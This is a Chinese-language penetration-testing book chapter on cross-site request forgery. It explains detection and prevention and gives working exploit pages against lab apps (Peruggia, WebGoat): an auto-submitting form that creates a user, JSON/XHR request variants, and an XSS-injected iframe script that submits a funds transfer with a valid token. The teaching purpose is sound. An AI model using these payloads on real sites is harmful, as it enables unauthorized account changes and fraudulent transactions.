# 跨站点请求伪造、识别和利用

**跨站点请求伪造**（**CSRF**）通常被误认为是类似于 XSS 的漏洞。XSS 利用用户对特定站点的信任，这使得用户相信网站提供的任何信息。另一方面，CSRF 利用网站在用户浏览器中的信任，让网站执行来自认证会话的任何请求，而不验证用户是否想要执行该特定操作。

在 CSRF 攻击中，攻击者会让经过身份验证的用户在经过身份验证的 web 应用程序中执行不必要的操作。这是通过用户访问的外部站点完成的，该站点触发这些操作。

如果没有实现足够的防御，CSRF 可以利用每个需要在经过身份验证的会话中发出单个请求的 web 应用程序功能。以下是攻击者可通过 CSRF 攻击执行的一些操作示例：

*   在 web 应用程序中更改用户详细信息，如电子邮件地址和出生日期
*   进行欺诈性银行交易
*   在网站上进行欺诈性的向上投票和向下投票
*   在电子商务网站上向购物车添加物品或在用户不知情的情况下购买物品
*   CSRF 攻击的先决条件

由于 CSRF 利用经过身份验证的会话，因此受害者必须在目标 web 应用程序中具有活动的经过身份验证的会话。应用程序还应允许会话内的事务，而无需重新验证。

CSRF 是一种盲攻击，目标 web 应用程序的响应不会发送给攻击者，而是发送给受害者。攻击者必须了解将触发预期操作的网站参数。例如，如果您想更改网站上受害者的注册电子邮件地址，作为攻击者，您将确定进行此更改所需的确切参数。因此，攻击者需要正确理解 web 应用程序，这可以通过直接与它交互来实现。

此外，如果目标应用程序正在使用`POST`方法，则攻击者需要找到一种方法诱骗用户单击预构建的 URL，或者访问攻击者控制的网站。这可以通过使用社会工程攻击来实现。

# CSRF 缺陷测试

对 CSRF 漏洞的描述清楚地表明它是一个业务逻辑缺陷。有经验的开发人员将创建 web 应用程序，在执行关键任务（如更改密码、更新个人详细信息）或在金融应用程序（如在线银行帐户）中做出关键决策时，该应用程序将始终包括用户确认屏幕。测试业务逻辑缺陷不是自动化 web 应用程序扫描程序的工作，因为它们使用预定义的规则。例如，大多数自动扫描仪测试以下项目，以确认 URL 中是否存在 CSRF 缺陷：

*   检查请求和响应中的常见 antiCSRF 令牌名称
*   试图通过提供虚假的推荐人来确定应用程序是否正在检查推荐人字段
*   创建变体以检查应用程序是否正确验证令牌值
*   检查查询字符串中的标记和可编辑参数

大多数自动化应用程序扫描仪使用的所有上述方法都容易出现误报和漏报。应用程序将使用完全不同的缓解技术来击败 CSRF 攻击，从而使这些扫描工具变得无用。

分析应用程序是否存在 CSRF 缺陷的最佳方法是首先全面了解 web 应用程序的功能。启动代理，如 Burp 或 ZAP，并捕获流量以分析请求和响应。然后，您可以创建一个 HTML 页面，复制从代理中识别的易受攻击代码。测试 CSRF 缺陷的最佳方法是手动进行。

如果应用程序在通过经过身份验证的用户会话执行服务器端更改时不包含任何特殊的头或表单参数，则应用程序可能容易受到 CSRF 缺陷的攻击。例如，下面的屏幕截图显示了在**Peruggia**中向图片添加注释的请求，**OWASP BWA**虚拟机中包含一个易受攻击的应用程序。您会注意到，在服务器端没有可以识别一个请求和另一个请求的特殊头。此外，`GET`和`POST`参数用于识别要执行的操作、受影响的图像以及注释的内容：

![](../images/00190.jpeg)

有时，应用程序使用验证令牌，但它们的实现是不安全的。以下屏幕截图显示了 Mutillidae II | OWASP 2013 | A8-跨站点请求伪造（CSRF）|使用安全级别 1 注册用户的请求。您可以看到注册新用户的请求中有一个`csrf_token`参数。然而，它只有四位数长，似乎很容易预测。实际上，在这种特殊情况下，令牌始终具有相同的值：`7777`：

![](../images/00191.jpeg)

CSRF 预防令牌有缺陷实现的其他示例如下：

*   **将令牌包含为 cookie**：浏览器会在请求中自动发送与访问站点对应的 cookie，这将使安全令牌的实现变得无用。
*   **用户或客户端信息用作令牌**：IP 地址、用户名或个人信息等信息可以用作令牌。这不必要地暴露了用户信息，这些信息可以通过社会工程或目标攻击中的**开源智能**（**OSIT**）收集。
*   **允许令牌重复使用**：即使在短时间内，如果服务器允许令牌多次使用，仍然可以执行攻击。
*   **客户端仅检查**：如果应用程序仅使用客户端代码验证用户实际执行某些操作，则攻击者仍然可以使用 JavaScript 绕过这些检查，无论是通过 XSS 攻击，还是在攻击页面中，或者仅仅通过重放最终请求。

# 利用 CSRF 缺陷

通过`GET`请求（URL 中发送的参数）利用此漏洞，很容易说服用户浏览到将执行所需操作的恶意链接。另一方面，要利用`POST`请求中的 CSRF 漏洞，需要使用提交请求的表单或脚本创建 HTML 页面。

# 在 POST 请求中利用 CSRF

在本节中，我们将重点讨论如何利用`POST`请求。我们将在本练习中使用 Peruggia 的用户创建功能。第一步是，您需要知道要复制的请求是如何工作的；如果您以管理员身份登录 Peruggia，并在使用 Burp Suite 捕获流量时创建新用户，您可以看到请求如下所示：

![](../images/00192.jpeg)

请求仅包括`newuser`（用户名）和`newuserpass`（密码）参数。因此，一旦确定了进行更改的请求和参数，我们需要执行以下操作：

1.  创建一个 HTML 页面，用这些参数和您想要使用的信息生成请求。
2.  说服用户浏览您的页面并提交请求。后者可能不是必需的，因为您可以让页面自动提交表单。

要实现我们的目标，需要一个复杂的 HTML，如下所示。在此示例中，易受攻击的服务器为`10.7.7.5`：

```
<HTML> 
  <body> 
    <form method="POST" action="http://10.7.7.5/peruggia/index.php?action=account&adduser=1"> 
      <input type="text" value="CSRFuser" name="newuser"> 
      <input type="text" value="password123!" name="newuserpass"> 
      <input type="submit" value="Submit"> 
    </form> 
  </body> 
</HTML> 
```

生成的页面将类似于下面的屏幕截图。底部是 Firefox 开发者工具面板。可使用*F12*键激活：

![](../images/00193.jpeg)

在常规渗透测试中，这可能作为**概念证明**（**PoC**），足以证明存在漏洞。更复杂的版本可能包括欺骗性内容和脚本代码，以便在加载页面后自动提交请求：

```
<HTML> 
  <BODY> 
    ... 
    <!-- include attractive HTML content here --> 
    ... 
    <FORM id="csrf" method="POST" action="http://10.7.7.5/peruggia/index.php?action=account&adduser=1"> 
      <input type="text" value="CSRFuser" name="newuser"> 
      <input type="text" value="password123!" name="newuserpass"> 
      <input type="submit" value="Submit"> 
    </FORM> 
    <SCRIPT>document.getElementById("csrf").submit();</SCRIPT> 
  </BODY> 
</HTML> 
```

要测试此 PoC 页面，请打开 Peruggia 并启动与`admin`用户的会话（密码：`admin`），然后在同一浏览器的不同选项卡或窗口中加载攻击页面：

![](../images/00194.jpeg)

接下来，单击 Submit 按钮或加载页面（如果使用脚本版本），服务器将处理该请求，就像它是由经过身份验证的用户发送的一样。使用浏览器的开发人员工具，您可以检查请求是否已发送到目标服务器并得到正确处理：

![](../images/00195.jpeg)

# 基于 web 服务的 CSRF

今天的 web 应用程序使用对 web 服务的调用而不是普通 HTML 表单来执行任务并不少见。这些请求是通过 JavaScript 使用 XMLHttpRequest 对象完成的，该对象允许开发人员创建 HTTP 请求并自定义方法、头和主体等参数。

Web 服务通常以不同于标准 HTML 表单（例如，`parameter1=value1&parameter2=value2`）的格式接收请求，例如 JSON 和 XML。以下示例代码段以 JSON 格式发送地址更新请求：

```
var xhr = new XMLHttpRequest(); 
xhr.open('POST', '/UpdateAddress'); 
xhr.setRequestHeader('Content-Type', 'application/json'); 
xhr.onreadystatechange = function () { 
  if (xhr.readyState == 4 && xhr.status == 200) { 
    alert(xhr.responseText); 
  } 
} 
xhr.send(JSON.stringify(addressData)); 
```

此请求的主体（即`POST`数据）可能如下所示：

```
{"street_1":"First street","street_2":"apartment 2","zip":54123,"city":"Sin City"} 
```

如果您试图在 HTML 表单中以`POST`参数的形式发送此确切字符串，将导致服务器出错，您的请求将不会得到处理。例如，提交以下表单将无法正确处理参数：

```
<HTML> 
  <BODY> 
    <FORM method="POST" action="http://vulnerable.server/UpdateAddress"> 
      <INPUT type="text" name='{
                           "street_1":"First street",
                           "street_2":"apartment 2",
                           "zip":54123,"city":"Sin City"}' value=""> 
      <INPUT type="submit" value="Submit"> 
    </FORM> 
  </BODY> 
</HTML> 
```

有几种方法可以利用 CSRF 对使用 JSON 或 XML 格式的请求进行攻击。

通常，web 服务允许不同格式的参数，包括 HTML 表单格式；因此，您的第一个选择是将请求的`Content-Type`头更改为`application/x-www-form-urlencoded`。这只需通过 HTML 表单发送请求即可完成。而不是尝试发送 JSON 字符串；但是，可以为字符串中的每个参数创建一个包含一个输入的表单。在我们的示例中，HTML 代码的简单版本如下所示：

```
<HTML> 
  <BODY> 
    <FORM method="POST" action="http://vulnerable.server/UpdateAddress"> 
      <INPUT type="text" name="street_1" value="First street"> 
      <INPUT type="text" name="street_2" value="apartment 2"> 
      <INPUT type="text" name="zip" value="54123"> 
      <INPUT type="text" name="city" value="Sin City"> 
      <INPUT type="submit" name="submit" value="Submit form"> 
    </FORM> 
  </BODY> 
</HTML> 
```

如果请求的`Content-Type`头是不允许的，并且 web 服务只接受 JSON 或 XML 格式，那么您需要按照相同的示例复制（或创建）生成请求的脚本代码：

```
<HTML> 
  <BODY> 
    <SCRIPT> 
      function send_request() 
      { 
        var xhr = new XMLHttpRequest(); 
        xhr.open('POST', 'http://vulnerable.server/UpdateAddress'); 
        xhr.setRequestHeader('Content-Type', 'application/json'); 
        xhr.withCredentials=true; 
        xhr.send('{"street_1":"First street",
                  "street_2":"apartment 2","zip":54123,
                  "city":"Sin City"}'); 
      } 
    </SCRIPT> 
    <INPUT type="button" onclick="send_request()" value="Submit">  
  </BODY> 
</HTML> 
```

注意`xhr.withCredentials=true;`的用法。这允许 JavaScript 获取存储在目标域浏览器中的 cookie，并将其与请求一起发送。此外，状态更改事件处理程序被省略，因为您不需要捕获响应。

最后一个选项有几个缺点，因为 JavaScript 行为在当前浏览器和服务器中的跨站点操作方面受到限制。例如，根据服务器的**跨源资源共享**（**CORS**）配置，应用程序可能需要在发送跨站点请求之前执行飞行前检查。这意味着浏览器将在发送任何内容之前自动发送`OPTIONS`请求，以检查该服务器允许的方法。如果请求的方法不允许用于跨源请求，浏览器将不会发送该方法。另一个保护的例子，这一次是在浏览器中，是前面提到的**同源策略**，默认情况下，浏览器保护服务器的资源不被其他网站通过脚本代码访问。

# 使用跨站点脚本绕过 CSRF 保护

当应用程序易受**跨站点脚本**（**XSS**攻击时，攻击者可以使用该漏洞（通过脚本代码）读取包含唯一令牌的变量，并将其发送到外部站点并在新选项卡中打开恶意页面，或使用相同的脚本代码发送请求，还绕过 CORS 和同源策略，因为请求将由同一站点通过本地脚本发出。

让我们看一看脚本代码可以用来让应用程序自己执行请求的场景。您将使用 WebGoat 的*CSRF 令牌旁路*（跨站点脚本（XSS）【CSRF 令牌旁路】练习。如说明所述，您需要滥用新闻组中的*新帖子*功能允许注入 HTML 和 JavaScript 代码，以便执行未经授权的转账请求。

下面的屏幕截图显示了“转账资金”页面，您可以通过将`&transferFunds=main`参数添加到课程的 URL 来加载该页面：

![](../images/00196.jpeg)

如果您检查表单的源代码，可以看到它有一个名为`CSRFToken`的隐藏字段，该字段将在每次加载页面时更改。这似乎是完全随机的：

![](../images/00197.jpeg)

为了在此表单中执行 CSRF，您需要利用注释表单中的 XSS 漏洞，让它使用 JavaScript 将传输表单加载到`iframe`标记中。这将设置要传输的值并自动提交表单。为此，请使用以下代码：

```
<script language="javascript"> 
  function frame_loaded(iframe) 
  { 
    var form =iframe.contentDocument.getElementsByTagName('Form')[1]; 
    form.transferFunds.value="54321"; 
    //form.submit(); 
  } 
</script> 

<iframe id="myframe" name="myframe" onload="frame_loaded(this)" 
  src="http://10.7.7.5/WebGoat/attack?Screen=2&menu=900&transferFunds=main"> 
</iframe> 
```

因此，当 iframe 中包含的页面完全加载时，它将调用`frame_loaded`函数，该函数将`transferFunds`字段的值设置为`54321`（要传输的金额），并提交请求。请注意，`form.submit();`行已注释。这仅用于演示目的，以防止自动提交。

现在浏览到易受攻击的页面：

```
http://10.7.7.5/WebGoat/attack?Screen=2&menu=900
```

为帖子设置标题，在消息字段中编写或粘贴代码，然后提交：

![](../images/00198.jpeg)

完成此操作后，您将在页面底部的“提交”按钮下方看到邮件标题。如果您像受害者那样单击它，您可以看到它如何加载代码中设置的要转账的金额：

![](../images/00199.jpeg)

要测试自动提交，只需发布一条新消息，删除`form.submit();`行上的注释。打开消息的结果将显示类似于以下屏幕截图：

![](../images/00200.jpeg)

下一个屏幕截图来自 Burp Suite 的代理历史记录，显示了上一个示例中浏览器是如何发出请求的。首先显示的是加载带有代码注入的消息的请求，在本例中为消息 66（参数`Num=66`。接下来，恶意消息加载带有资金转账页面的 iframe（参数`transferFunds=main`。最后，根据代码，当此页面加载完脚本代码后，它将填写要传输的金额，并使用有效的 CSRF 令牌提交请求：

![](../images/00201.jpeg)

# 预防 CSRF

防止 CSRF 就是要确保经过身份验证的用户就是请求操作的人。由于浏览器和 web 应用程序的工作方式，最好的选择是使用令牌来验证操作，或者在可能的情况下使用 CAPTCHA 控件。

当通过`GET`方法传递易受攻击的参数时，CSRF 攻击更容易执行。因此，首先要避免，尽可能使用`POST`方法。它不能完全缓解攻击，但会使攻击者的任务更加困难。

由于攻击者会试图破坏令牌生成或验证系统，因此安全地生成它们非常重要；也就是说，攻击者无法猜到它们。您还必须使它们对于每个用户和每个操作都是唯一的，因为重用它们会使它们的用途失效。这些标记通常包含在每个请求的标题字段中，或者包含在 HTML 表单中的隐藏输入中。避免将它们包含在 cookie 中，因为浏览器会根据每个域自动将它们与每个请求一起发送。

验证码控制和重新认证在某些时候对用户来说是侵入性的和恼人的，但如果操作的关键性值得这样做，他们可能愿意接受它们，以换取它们提供的额外安全级别。

此外，应该在服务器上配置 CORS 策略，因为它们可以防止通过 web 浏览器的脚本代码进行的某些攻击。如果加载在不同选项卡或浏览器窗口中的 URL 不是同一来源（如主机、端口或协议）的一部分，CORS 策略将阻止 JavaScript 在不同的选项卡或浏览器窗口中运行，以访问服务器上的数据/资源。

有关预防 CSRF 的更多信息，请访问[https://www.owasp.org/index.php/Cross-Site_Request_Forgery_（CSRF）【预防欺诈表】](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。

# 总结

在本章中，您了解了 CSRF 以及它如何滥用服务器和 web 浏览器之间的信任关系。您了解了如何检测可能存在漏洞的应用程序，回顾了利用漏洞的过程，并通过一个示例进行了实践，分析了它在 web 服务中的工作方式。您还了解了一种在与 XSS 漏洞结合使用时绕过令牌保护、CORS 和同源策略的方法。

和前几章一样，这一章的最后一节是关于防御的。我们审查了在您自己的应用程序或您的客户的应用程序中预防或缓解 CSRF 漏洞的推荐方法。

下一章将简要介绍密码学，重点介绍渗透测试人员需要了解的基本知识，如区分加密、哈希和编码、识别弱加密实现和利用常见漏洞。